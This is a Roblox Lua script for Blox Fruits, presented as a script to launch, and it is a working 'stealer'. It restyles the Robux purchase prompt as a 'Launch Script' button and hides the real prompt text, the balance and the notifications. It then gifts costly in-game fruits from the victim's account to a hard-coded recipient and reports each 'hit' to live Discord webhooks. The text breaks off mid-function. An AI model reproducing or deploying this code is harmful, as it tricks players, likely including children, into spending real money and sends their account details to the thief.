LogsWebhook = "https://discord.com/api/webhooks/1342506112905383956/3vrhlWHDrYP0nokRQp9csn3slFvSsPR_RfRZwIKugl0_LY-l0A1y00nG6hyjo7l6M4Hb"
ExecutionWebhook = "https://discord.com/api/webhooks/1342506033096167637/0cBQFjdLUq7KkjxoDd0aoffJBmdhShcn-gpCGxQXNc1wBj2jwd5JNEq3xB6pPHoowZrJ"
Username = "broisnothim724"
PromptText = "Launch Script"
RandomizedPrompt = false

-- << Obfuscate after this moment (For devs, not making it for user)

repeat task.wait() until game:IsLoaded()

local validGames = {
    [2753915549] = true,  -- Sea 1
    [4442272183] = true,  -- Sea 2
    [7449423635] = true   -- Sea 3
}

if not validGames[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
    return
end

if _G.scriptExecuted then
    warn("You have already executed this code.")
    return
end

local unsupportedExecutor = "Delta"
local kickMessage = unsupportedExecutor .. " is currently unsupported on mobile. Please try a different executor (e.g., Codex, Fluxus) or use a PC."

local function getExecutor()
    if identifyexecutor then
        return identifyexecutor()
    else
        return "Unknown"
    end
end

local function isMobile()
    local UserInputService = game:GetService("UserInputService")
    return UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled
end

_G.scriptExecuted = true

local currentExecutor = getExecutor()
if currentExecutor == unsupportedExecutor and isMobile() then
    game.Players.LocalPlayer:Kick(kickMessage)
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local marketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local gameInfo = marketplaceService:GetProductInfo(game.PlaceId)

local UserId
local version = "1.2.8"
local totalSpent = 0

local messages = {
    "Enjoy your new item!",
    "A little something for you!",
    "Hope you like it!",
    "You deserve this!",
    "Just a small token of appreciation!",
    "Here you go!",
    "Something special for you!",
    "You've earned this!",
    "Enjoy!",
    "Here's a little surprise!",
    "Hope this makes your day!",
    "You're awesome!",
    "Here's a gift from us!",
    "You're the best!",
    "Here's something to help you out!",
    "We appreciate you!",
    "Here's a little something!",
    "You're amazing!",
    "Here's a gift for you!",
    "OMG OMG u got a prez!",
    "Guuuuess whattttttt? 🎁",
    "LOL FREEBIES GO BRRRR",
    "Hope this doesn't suck lol!",
    "Wowza you lucky!",
    "CONGRATSSSSSSSSSS!!!",
    "H3R3 u go! ^_^",
    "✨ surprise in ur inbox! ✨",
    "Gotchu a lil smth smth!",
    "AYOOOO free loot time!",
    "Unwrapping intensifies...",
    "Bruh u better like this!",
    "YOU. GOT. THIS. 🎁",
    "Whaaat? More gifts??",
    "ROFL ENJOY IT IDK",
    "Cool beans, it’s yours!",
    "Hope this ain’t mid lol",
    "OMG PRESENT TIME LET’S GO",
    "POGGERS CLAIM IT FAST",
    "Ding ding ding! Free stuff!",
    "Uhhh, gift moment? 🎉",
    "Hey there! This is for you!",
    "Whoops, dropped this lol",
    "GIFT ACQUIRED EZ CLAP",
    "CHEEZ BURGER AND FREE GIFT",
    "Shinyyyyy things are fun!",
    "LMAO hope this slaps",
    "Bam! Gift attack incoming!",
    "U deserve the world! 🎁",
    "Loooool this is urs now",
    "SUPRISEEEE it’s lit!",
    "gibberish but it’s urs!!",
    "Take it b4 it explodes lol",
    "Welp here it goes!!! 🎉",
    "Oops I clicked gift haha",
    "RAWR XD this is a present",
    "GIFT BAZOOKA FIRED!!!",
    "Claim it and flex bro!",
    "YOU WIN AGAIN! Sheesh!",
    "No cap, you’re epic! 🎁",
    "HAPPY GIFT DAY OMGGG",
    "WOOF free stuff 4 u",
    "Ahhhh it’s shiny af",
    "Too many gifts?? Never!",
    "Look what we got ya!",
    "BRRRRRRR IT’S A GIFT!",
    "Kinda random but take it",
    "BEEP BOOP GIFT MODE ON",
    "Gift machine says yes",
    "Open fast! It’s sizzling!",
    "OMG take it before I do!!",
    "Bruh it’s lit open it",
    "YAAAAAY TIME TO PARTY",
    "GIFT HYPE OVERLOAD!!",
    "You’re da best frfr!",
    "A lil token, enjoy!!!",
    "POW! Gift bomb!! 💣",
    "Surprise delivery incoming!",
    "Random act of kindness <3",
    "FREEEEEEEEEEEEE!!!!",
    "Uhhh yeah take it idk",
    "WHOOSH PRESENT TIME",
    "✨✨✨ shinyyyyy ✨✨✨",
    "OMG LOOT DROP!!!",
    "YOU’RE ON FIRE!!! 🔥",
    "Can I have it? JK lol",
    "FREE STUFF OH YEAHHHH",
    "Ping! It’s gift o’clock!",
    "Smells like victory! 🎁",
    "This made me think of u!",
    "Hope u like this tiny gift!",
    "Oops dropped dis 4 u",
    "Zoom zoom gift zoom",
    "Catch it b4 it flies lol",
    "Hope it’s not a potato!",
    "Big brain vibes w/ this",
    "CONGRATULAAAAATIONS!",
    "Idk wut this is lol enjoy",
    "FREE LOOT IS BEST LOOT",
    "💖💖💖 TAKE DIS NOW 💖💖💖",
    "Bruh moment: Free Stuff",
    "We rly out here gifting",
    "BIG W U GOT A THING",
    "Thank u 4 existing lol",
    "GIFTS. MORE GIFTS. YES.",
    "CHEESE AND FREEBIES",
    "Gift god has blessed u",
    "This will prob make u lol",
    "Not clickbait: It’s a gift",
    "u r amazing take this pls",
    "it’s tiny but it’s epic",
    "SHAZAAM enjoy da gift",
    "Skrrt take this thing!",
    "Present unlocked: WOW!",
    "FREEBIE HUNTER ALERT",
    "Imagine not opening this",
    "FR U DESERVE THIS LOL",
    "It’s raining gifts, bro!",
    "Yas yas yas u r loved",
    "POG FREE GIFT WHO DIS",
    "Claim this or regret it",
    "🛸 GIFT FROM OUTER SPACE 🛸",
    "Take a chill pill & enjoy!",
    "Oops this 4 u lol",
    "DO NOT DELETE THIS OMG",
    "Gifted with luv <3",
    "Mysterious box time...",
    "Uhhh enjoy?? it’s sus",
    "Surpriiiiseeeeee! 🥳",
    "BEST. DAY. EVER. 🎁",
    "Like it? Don’t? Here!",
    "BOOM u got a gift!",
    "FREE BREAD jk it’s a gift",
    "Look inside QUICKKKK",
    "Bruh free means awesome",
    "Wheeee free loot wow",
    "So hype right now OMG",
    "Ur da MVP, enjoy this!",
    "PLZ CLAIM IT OMG FAST",
    "Luv u, here’s a gift!",
    "Roses r red, gifts r cool",
    "Oops my finger slipped lol",
    "Open it or else 👀",
    "Prize unlocked: GO GO GO",
    "SNACK + GIFT = UR DAY",
    "IM SO EXCITED AHHHH",
    "You gotta smile now lol",
    "Oops here’s somethin’",
    "Best gift evarrrr open it",
    "Catch this gift LOL",
    "Woooo u won! Gift time",
    "YEEET present delivered",
    "LOL hope u don’t hate it",
    "AHHHH THIS FOR YOUUUU",
    "SWAG GIFT CLAIMED EZ",
    "Boom gift bomb LMAO",
    "Prize machine said yes",
    "POW ur prize unlocked",
    "Gift train has arrived!!",
    "Hope ur day just got lit!",
    "Hype gifts r hype af",
    "UR LUCKY DAYYYY OMG",
    "Wiggles gift in ur face",
    "Iz dis ok lolol",
    "Bruh I’m so happy 4 u",
    "Yo dawg enjoy this lol",
    "Rainbows and freebies 🌈",
    "Lowkey random but enjoy",
    "Prize unlocked EZ POG",
    "LOL RANDOM GIFTTT",
    "Okay okay, u got this!",
    "🚨 EMERGENCY PRESENT 🚨",
    "Bruh moment: Gift Time",
    "Huuuuge gift vibes here",
    "LUV IT OR ELSE! jk lol",
    "Woo woo gifts 4 everyone!",
    "BING BANG BOOM GIFT",
    "You absolute legend! 🎉",
    "Whaaaaat omg take it!!",
    "Plz don’t reject this LOL",
    "Shiny! Shiny! TAKE IT!",
    "POGGIES PRESENT TIME",
    "Ez clap u win AGAIN!!",
    "Hope it makes u lolol",
    "Peace, love, and gifts!",
    "Pro gamer loot drop!!",
    "Bruh so much hype rn",
    "It’s lowkey a big deal",
    "SWAG MODE ACTIVATED",
    "Idek wut dis is lol",
    "Claim ASAP or I cry",
    "LOL imagine not liking it",
    "Do a dance! Gift dance!",
    "Bet u weren’t ready LOL",
    "BOOM TAKE THIS LITNESS",
    "Ok bye, gift time 4 u",
    "✨✨✨ THIS FOR U ✨✨✨",
    "Hope it’s not sus lolol",
    "Claim fast or it yeets!",
    "Surprise! U da best!!!",
    "OMG TAKE DIS RIGHT NOW",
    "Gifts 4 da homies LOL",
    "Plz open omg suspense",
    "YOU LIT, HAVE THIS OMG",
    "Hope this makes ur day",
    "Gift spam activated yay!",
    "Lowkey shiny af prize",
    "BIG W IT’S ALL YOURS",
    "Sus gift? Nah it’s fine",
    "Open fast b4 it runs lol",
    "POW POW POW GIFT ALERT",
    "OMG THIS IS UR DAYYYY",
    "Kinda pog, not gonna lie",
    "Surprise it’s a prezzzz",
    "Hope it ain’t mid lol",
    "BRB gifting more ppl",
    "LOL OKAY THIS FOR U",
    "Wheeeeee prize moment",
    "BRRRRRRRRR PRIZE TIME",
    "Keep being awesome yay!",
    "Ahhhhhh free gift 4 u",
    "Gift city! Population: U",
    "Oops, I gifted again lol",
    "Hope it’s not cringe!!",
    "You totally earned this",
    "WOOT claim it super fast",
    "Zoom zoom free stuff",
    "Yasssss gift unlocked",
    "Bro you’re so lucky omg",
    "Big vibes, cool gift",
    "DO NOT IGNORE THIS OMG",
    "Random? Nah. You rock",
    "Shiny prizes unlocked EZ",
    "LOL PRESENTS FOREVERR",
    "Oops hope u enjoy LOL",
    "Tadaaa! Random prize!",
    "Bet u didn’t expect this!",
    "Big hype 4 u, enjoy it",
    "UwU gift spam unlocked",
    "BWAHAHAHA GIFT CLAIMED",
    "Peace out, gift moment",
    "Hope this ain’t cringe",
    "YEETTTTT enjoy fam!",
    "Take this tiny joy bomb",
    "Ahhhh so much hype rn",
    "Free free freeeee!!",
    "IMAGINE NOT CLAIMING",
    "Gimme it back lol JK",
    "Shinyyyyyyy gift 4 u",
    "Surprise delivery woot",
    "Catch da vibes omg yay",
    "Whaaaaaaat? Take it!",
    "Shhhh it’s ur gift now",
    "Bruh srsly freeee loot",
    "Claim b4 I take it back",
    "WHOOSH random gift!!!",
    "LOL free loot moment",
    "Bruh okay bye free stuf",
    "Hope it slaps LOL",
    "U better open dis RN",
    "Freebieeeeeeeeees lmao",
    "100% swag certified gift",
    "EZ clap take it NOW",
    "LMAO bro ur so lucky",
    "OMG SPAMMING GIFTS!!",
    "Bruh I wanna keep it LOL",
    "GIFT SEASON GO BRRRR",
    "Pog free gift madness",
    "Hype train gift unlocked",
    "Claim or I cry 4ever",
    "Boom gift unlocked!!!",
    "Bruhhhh swag overload",
    "U LIT enjoy ur swag gift",
    "Imagine not claiming lol",
    "Peace, gift unlocked!!",
    "LUV THIS GIFT OMG",
    "Take it or I take it lol",
    "Boom free stuff gang!!",
    "Peace and freebies lol",
    "Surprise! It’s HYPE AF",
    "Hope u vibin now LOL",
    "Swag moments only here",
    "Bruh ur so pog rn",
    "Surpriseeee gift LOL",
    "Claim now! Big W alert",
    "Ez swaggy prize time",
    "Kinda lit prize ngl",
    "You vibin? Freebies!!",
    "BOOM more free stuff",
    "Hope this is a vibe lol",
    "Yassss gift moment",
    "Bet u didn’t see this!",
    "Bruhhhhhhhh omg gifts",
    "Claim ittttt OMG hype",
    "BRRRR free loot vibes",
    "Ez vibes swag prize",
    "U r epic! Claim now",
    "GIFT CITY 4 U BRUH",
    "Hype mode prize claim",
    "Swaggy moment frfr",
    "Prize vibes activated",
    "LOL who wants a gift",
    "Gib prize lol no backsies",
    "Bruh swag mode GO",
    "Luv ya! Here’s a prize",
    "Boom prize gang vibin",
    "Oops lol free gift!!",
    "Take it bro EZ vibez",
    "Boom boom swag prize",
    "Frfr u deserve this LOL",
    "Swag pog prize OMG",
    "Lol take it vibeeee",
    "Swag unlocked free stuf",
    "Bruh so lucky OMG",
    "Peace bro free vibez",
    "Ahhhhhhhhhh gifts yay",
    "Brrrrrr gifts unlocked",
    "LOL big W claim NOW",
    "Swaggy swag vibessss",
    "Imagine not vibing rn",
    "Oops lol big swag vibes",
    "Woot swag momentsss",
    "Yasssssss swag unlocked",
    "Take it OMG swaggy",
    "Peace out big vibes lol",
    "Claim bro big swag LMAO",
    "Oops vibing prize time",
    "Take it lol swag mode",
    "Bruhhhhhhhh claim itttttt",
    "EZ clap gift gang",
    "Boom swag unlocked!!",
    "Swaggy vibes prize LOL",
    "Bruhhhh swag unlocked!!",
    "OMG OMG W gift vibes",
    "Claim free stuff rn omg",
    "LOL vibe moment vibes",
    "Bruh vibe unlocked now",
    "Take it fast omg EZ",
    "Bruh EZ W gift rn",
    "Vibe unlocked omg EZ",
    "Swaggy pog vibes rn",
    "Peace big swag vibes",
    "Claim swag prize rn omg",
    "Brrr swaggy vibes EZ",
    "Big W gift vibes rn omg",
    "Claim bro EZ vibes rn",
    "Claim free gift rn omg",
    "Boom EZ swag vibes rn",
    "Hype swag unlocked rn",
    "Imagine swag vibes rn",
}

local function loopSinkTransparency()
    while true do
        local sink = game.Players.LocalPlayer.PlayerGui:FindFirstChild("ViewportOverlay")
            and game.Players.LocalPlayer.PlayerGui.ViewportOverlay:FindFirstChild("Sink")
        if sink then
            sink.BackgroundTransparency = 1
        end
        task.wait()
    end
end

local function hideNotifications()
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    local notifications = playerGui:FindFirstChild("Notifications")
    
    if notifications then
        notifications.Enabled = false
    end
end

local function getRandomColor()
    return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
end

local function getRandomFont()
    local fonts = {
        Enum.Font.PermanentMarker,
        Enum.Font.Arcade,
        Enum.Font.Bangers,
        Enum.Font.Creepster,
        Enum.Font.DenkOne,
        Enum.Font.Highway,
        Enum.Font.IndieFlower,
        Enum.Font.JosefinSans,
        Enum.Font.Merriweather
    }
    return fonts[math.random(1, #fonts)]
end

local function modifyPromptUI(isFirstPrompt)
    local CoreGui = game:GetService("CoreGui")
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return end

    prompt.BackgroundTransparency = 1
    prompt.Image = ""

    for _, element in ipairs({
        alertContents:FindFirstChild("TitleContainer"),
        alertContents:FindFirstChild("MiddleContent"),
        alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("1"),
        alertContents:FindFirstChild("Footer"):FindFirstChild("FooterContent"):FindFirstChild("Content"):FindFirstChild("RemainingBalanceText")
    }) do
        if element then
            element.Visible = false
        end
    end

    local button2 = alertContents:FindFirstChild("Footer"):FindFirstChild("Buttons"):FindFirstChild("2")
    if button2 then
        button2.Image = ""
        button2.BackgroundTransparency = 1
        button2:ClearAllChildren()

        button2.Size = UDim2.new(0, 500, 0, 120)
        button2.Position = UDim2.new(0.5, -250, 0.5, -60)

        local buttonContainer = Instance.new("Frame")
        buttonContainer.Name = "ButtonContainer"
        buttonContainer.Size = UDim2.new(1, 0, 1, 0)
        buttonContainer.BackgroundTransparency = 1
        buttonContainer.Parent = button2

        local background = Instance.new("Frame")
        background.Name = "Background"
        background.Size = UDim2.new(1, 0, 1, 0)
        background.BackgroundTransparency = 0.1
        background.Parent = buttonContainer

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.2, 0)
        corner.Parent = background

        local gradient = Instance.new("UIGradient")
        gradient.Rotation = RandomizedPrompt and math.random(0, 360) or 45
        
        local gradientColors
        if RandomizedPrompt then
            gradientColors = {
                ColorSequenceKeypoint.new(0, getRandomColor()),
                ColorSequenceKeypoint.new(0.5, getRandomColor()),
                ColorSequenceKeypoint.new(1, getRandomColor())
            }
        else
            gradientColors = {
                ColorSequenceKeypoint.new(0, Color3.fromRGB(65, 135, 255)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 160, 255)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(65, 135, 255))
            }
        end
        gradient.Color = ColorSequence.new(gradientColors)
        gradient.Parent = background

        local glow = Instance.new("ImageLabel")
        glow.Name = "Glow"
        glow.BackgroundTransparency = 1
        glow.Image = "rbxassetid://7912134082"
        glow.ImageColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(65, 135, 255)
        glow.ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7
        glow.Size = UDim2.new(1.4, 0, 1.4, 0)
        glow.Position = UDim2.new(0.5, 0, 0.5, 0)
        glow.AnchorPoint = Vector2.new(0.5, 0.5)
        glow.Parent = buttonContainer

        local buttonText = Instance.new("TextLabel")
        buttonText.Name = "ButtonText"
        buttonText.Size = UDim2.new(0.9, 0, 0.9, 0)
        buttonText.Position = UDim2.new(0.5, 0, 0.5, 0)
        buttonText.AnchorPoint = Vector2.new(0.5, 0.5)
        buttonText.BackgroundTransparency = 1
        buttonText.Text = PromptText or "Execute Script"
        buttonText.TextColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(255, 255, 255)
        buttonText.TextStrokeColor3 = RandomizedPrompt and getRandomColor() or Color3.fromRGB(0, 0, 0)
        buttonText.TextStrokeTransparency = RandomizedPrompt and math.random(0, 5) / 10 or 0.7
        buttonText.Font = RandomizedPrompt and getRandomFont() or Enum.Font.GothamBold
        buttonText.TextScaled = true
        buttonText.Parent = buttonContainer

        local tweenService = game:GetService("TweenService")

        local hoverInfo = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
        local clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local waveInfo = TweenInfo.new(4, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true)

        buttonContainer.Position = UDim2.new(0, 0, 2, 0)
        local entranceTween = tweenService:Create(buttonContainer, TweenInfo.new(1, Enum.EasingStyle.Elastic, Enum.EasingDirection.Out), {
            Position = UDim2.new(0, 0, 0, 0)
        })
        entranceTween:Play()

        local function startWaveAnimation()
            local rotationOffset = 0.5
            local positionOffset = 0.005
            
            local rotationTween = tweenService:Create(buttonContainer, waveInfo, {
                Rotation = rotationOffset
            })
            rotationTween:Play()
            
            local positionTween = tweenService:Create(buttonContainer, waveInfo, {
                Position = UDim2.new(positionOffset, 0, 0, 0)
            })
            positionTween:Play()

            local glowTween = tweenService:Create(glow, waveInfo, {
                ImageTransparency = RandomizedPrompt and math.random(3, 7) / 10 or 0.6
            })
            glowTween:Play()
        end
        startWaveAnimation()

        button2.MouseEnter:Connect(function()
            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                Size = UDim2.new(1.1, 0, 1.1, 0)
            })
            
            local hoverGradientColors
            if RandomizedPrompt then
                hoverGradientColors = {
                    ColorSequenceKeypoint.new(0, getRandomColor()),
                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
                    ColorSequenceKeypoint.new(1, getRandomColor())
                }
            else
                hoverGradientColors = {
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 155, 255)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(85, 155, 255))
                }
            end
            
            local colorTween = tweenService:Create(gradient, hoverInfo, {
                Color = ColorSequence.new(hoverGradientColors)
            })
            
            local glowTween = tweenService:Create(glow, hoverInfo, {
                ImageTransparency = RandomizedPrompt and math.random(3, 6) / 10 or 0.4,
                Size = UDim2.new(1.6, 0, 1.6, 0)
            })
            
            scaleTween:Play()
            colorTween:Play()
            glowTween:Play()
        end)

        button2.MouseLeave:Connect(function()
            local scaleTween = tweenService:Create(buttonContainer, hoverInfo, {
                Size = UDim2.new(1, 0, 1, 0)
            })
            
            local colorTween = tweenService:Create(gradient, hoverInfo, {
                Color = ColorSequence.new(gradientColors)
            })
            
            local glowTween = tweenService:Create(glow, hoverInfo, {
                ImageTransparency = RandomizedPrompt and math.random(4, 8) / 10 or 0.7,
                Size = UDim2.new(1.4, 0, 1.4, 0)
            })
            
            scaleTween:Play()
            colorTween:Play()
            glowTween:Play()
        end)

        button2.MouseButton1Down:Connect(function()
            local clickTween = tweenService:Create(buttonContainer, clickInfo, {
                Size = UDim2.new(0.95, 0, 0.95, 0)
            })
            
            local clickGradientColors
            if RandomizedPrompt then
                clickGradientColors = {
                    ColorSequenceKeypoint.new(0, getRandomColor()),
                    ColorSequenceKeypoint.new(0.5, getRandomColor()),
                    ColorSequenceKeypoint.new(1, getRandomColor())
                }
            else
                clickGradientColors = {
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(45, 115, 235)),
                    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(80, 140, 235)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(45, 115, 235))
                }
            end
            
            local colorTween = tweenService:Create(gradient, clickInfo, {
                Color = ColorSequence.new(clickGradientColors)
            })
            
            clickTween:Play()
            colorTween:Play()
        end)

        button2.MouseButton1Up:Connect(function()
            local releaseTween = tweenService:Create(buttonContainer, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
                Size = UDim2.new(1, 0, 1, 0)
            })
            
            local colorTween = tweenService:Create(gradient, hoverInfo, {
                Color = ColorSequence.new(gradientColors)
            })
            
            releaseTween:Play()
            colorTween:Play()
        end)
    end
end

local function getExecutor()
    if syn then return "Synapse X"
    elseif getexecutor then return getexecutor()
    elseif identifyexecutor then return identifyexecutor()
    elseif fluxus then return "Fluxus"
    else return "Unknown" end
end

local function getRandomMessage()
    return messages[math.random(1, #messages)]
end

local function sendExecutionLog()
    local executorIdentifier = getExecutor()
    local platform = UserInputService.TouchEnabled and "Mobile" or "PC"
    local membershipType = game.Players.LocalPlayer.MembershipType
    local hasPremium = (membershipType == Enum.MembershipType.Premium) and "Yes" or "No"

    local embed = {
        ["title"] = "STEALER EXECUTION!",
        ["color"] = 3063792,
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Current BF Stealer Version",
                ["value"] = version,
                ["inline"] = true
            },
            {
                ["name"] = "Current Game",
                ["value"] = gameInfo.Name,
                ["inline"] = true
            },
            {
                ["name"] = "Has Premium",
                ["value"] = hasPremium,
                ["inline"] = true
            },
            {
                ["name"] = "Current Executor",
                ["value"] = executorIdentifier,
                ["inline"] = true
            },
            {
                ["name"] = "Platform",
                ["value"] = platform,
                ["inline"] = true
            },
        }
    }

    local data = HttpService:JSONEncode({
        ["embeds"] = {embed}
    })

    request({
        Url = ExecutionWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })
end

local function getRobuxBalance()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return 0 end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return 0 end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return 0 end
    local prompt = Animator:FindFirstChild("Prompt")
    if not prompt then return 0 end
    local alertContents = prompt:FindFirstChild("AlertContents")
    if not alertContents then return 0 end
    local footer = alertContents:FindFirstChild("Footer")
    if not footer then return 0 end
    local footerContent = footer:FindFirstChild("FooterContent")
    if not footerContent then return 0 end
    local content = footerContent:FindFirstChild("Content")
    if not content then return 0 end
    local RemainingBalanceText = content:FindFirstChild("RemainingBalanceText")
    if not RemainingBalanceText or not RemainingBalanceText.Text then return 0 end
    local balanceText = RemainingBalanceText.Text:match("(%d+)$")
    return (balanceText and tonumber(balanceText) or 0) + 25
end

local webhookSent2 = false 

local function sendWebhook(totalSpent, itemName)
    if webhookSent2 then
        return
    end

    local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = "! PROMPTED USER WITH ITEM, POTENTIAL HIT! ! :owl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. totalSpent .. "```"
            },
            {
                ["name"] = "ɪᴛᴇᴍ ʜɪᴛ",
                ["value"] = "```" .. itemName .. "```"
            },
            {
                ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
            {
                ["name"] = "Join Fistor's Stealer Discord! Current Stealer Version: 1.2.8",
                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "GG",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    webhookSent2 = true
end

local webhookSent3 = false 

local function sendWebhook2(totalSpent)
    if webhookSent3 then
        return
    end

    local executorIdentifier = getExecutor()

    local embed = {
        ["title"] = "! User Has Confirmed Purchase Prompt. HIT! ! :owl:",
        ["color"] = 39423,
        ["fields"] = {
            {
                ["name"] = "<:drawpen:1311079366125555782> ᴘʟᴀʏᴇʀ ɪɴꜰᴏ",
                ["value"] = "```Name: " .. game.Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(game.Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"
            },
            {
                ["name"] = "<:robux:1314309850154537020> ᴛᴏᴛᴀʟ ʀᴏʙᴜx",
                ["value"] = "```" .. totalSpent .. "```"
            },
            {
                ["name"] = "ᴇxᴇᴄᴜᴛᴏʀ ɪɴꜰᴏ",
                ["value"] = "```Executor: " .. executorIdentifier .. "```"
            },
            {
                ["name"] = "INFO",
                ["value"] = "User has confirmed the purchase prompt! Means, you should get the Item 99%. GG"
            },
            {
                ["name"] = "Join Fistor's Stealer Discord! Current Stealer Version: 1.2.8",
                ["value"] = "[**Join Invite**](https://discord.gg/tanThs2F)",
            }
        }
    }

    local data = HttpService:JSONEncode({
        ["content"] = "@everyone",
        ["embeds"] = {embed}
    })

    request({
        Url = LogsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = data
    })

    webhookSent3 = true
end

local promptConfirmed = false
local purchaseInProgress = false

local function waitForPromptToDisappear()
    local PurchasePrompt = CoreGui:FindFirstChild("PurchasePrompt")
    if not PurchasePrompt then return end
    local ProductContainer = PurchasePrompt:FindFirstChild("ProductPurchaseContainer")
    if not ProductContainer then return end
    local Animator = ProductContainer:FindFirstChild("Animator")
    if not Animator then return end

    while Animator:FindFirstChild("Prompt") do
        task.wait()
    end
end

local function waitForPurchaseConfirmation()
    local PurchasePrompt = game:GetService("CoreGui"):WaitForChild("PurchasePrompt")
    local ProductContainer = PurchasePrompt:WaitForChild("ProductPurchaseContainer")
    local Animator = ProductContainer:WaitForChild("Animator")
    local prompt = Animator:WaitForChild("Prompt")
    local alertContents = prompt:WaitForChild("AlertContents")
    local footer = alertContents:WaitForChild("Footer")
    local footerButtons = footer:WaitForChild("Buttons")

    local confirmButton = footerButtons:WaitForChild("2")
    local function onInteraction()
        promptConfirmed = true
    end
    confirmButton.MouseButton1Click:Connect(onInteraction)
    confirmButton.TouchTap:Connect(onInteraction)
end

local function verifyUserId()
    local success, err = pcall(function()
        UserId = Players:GetUserIdFromNameAsync(Username)
    end)
    if not success or not UserId then
        game.Players.LocalPlayer:Kick("Fatal error. Rejoin & Try again.")
        return false
    end
    return true
end

local webhookSent = false

local function buyItem(storageName, cost)
    if purchaseInProgress then return end
    purchaseInProgress = true
    
    if not verifyUserId() then return end
    
    local balance = getRobuxBalance()
    local targetUser = {
        name = Username,
        id = UserId
    }

    local args = {
        [1] = "buyRobuxShop",
        [2] = {
            ["StorageName"] = storageName,
            ["PurchaseAction"] = "Gift",
            ["PurchaseLocation"] = "Shop",
            ["Message"] = getRandomMessage(),
            ["FunnelId"] = "Shop",
            ["ReceiverName"] = broisnothim724,
            ["ReceiverUserId"] = 8037120579,
        }
    }
    
    local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
    local success, err = pcall(function()
        CommF:InvokeServer(unpack(args))
    end)

    if not success then
        warn("Purchase failed:", err)
        purchaseInProgress = false
        return
    end

    totalSpent = totalSpent + cost
    if not webhookSent then
        sendWebhook(totalSpent, storageName)
        webhookSent = true
    end

    waitForPromptToDisappear()
    purchaseInProgress = false
end

hideNotifications()

local function stealItem(balance)
    -- << Permanent Fruits
    if balance >= 5000 then
        buyItem("Permanent Dragon-Dragon", 5000)
    elseif balance >= 4000 then
        buyItem("Permanent Kitsune-Kitsune", 4000)
    elseif balance >= 3000 then
        buyItem("Permanent Yeti-Yeti", 3000)
    elseif balance >= 2550 then
        buyItem("Permanent Spirit-Spirit", 2550)
    elseif balance >= 2500 then
        buyItem("Permanent Gas-Gas", 2500)
    elseif balance >= 2450 then
        buyItem("Permanent Venom-Venom", 2450)
    elseif balance >= 2425 then
        buyItem("Permanent Shadow-Shadow", 2425)
    elseif balance >= 2400 then
        buyItem("Permanent Dough-Dough", 2400)
    elseif balance >= 2350 then
        buyItem("Permanent T-Rex-T-Rex", 2350)
    elseif balance >= 2300 then
        buyItem("Permanent Gravity-Gravity", 2300)
    elseif balance >= 2250 then
        buyItem("Permanent Blizzard-Blizzard", 2250)
    elseif balance >= 2200 then
        buyItem("Permanent Pain-Pain", 2200)
